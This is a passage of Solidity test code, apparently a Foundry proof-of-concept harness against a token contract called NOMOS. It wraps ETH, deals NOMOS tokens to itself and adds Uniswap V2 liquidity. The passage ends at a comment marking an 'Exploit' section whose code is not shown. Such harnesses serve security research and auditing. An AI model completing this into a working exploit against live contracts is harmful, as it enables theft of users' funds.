                IUniswapV2Router02 router = NOMOS(TARGET).uniswapV2Router();
                address weth = router.WETH();

                // Get WETH
                IWETH(weth).deposit{value: wethAmount}();

                // Deal NOMOS to self for liquidity
                deal(TARGET, address(this), nomosAmount);

                // Approve router
                NOMOS(TARGET).approve(address(router), type(uint256).max);
                IERC20(weth).approve(address(router), type(uint256).max);

                router.addLiquidity(
                    TARGET,
                    weth,
                    nomosAmount,
                    wethAmount,
                    0,
                    0,
                    address(this),
                    block.timestamp
                );
    }

    // ─── Exploit ─────────────────────────────────────────────
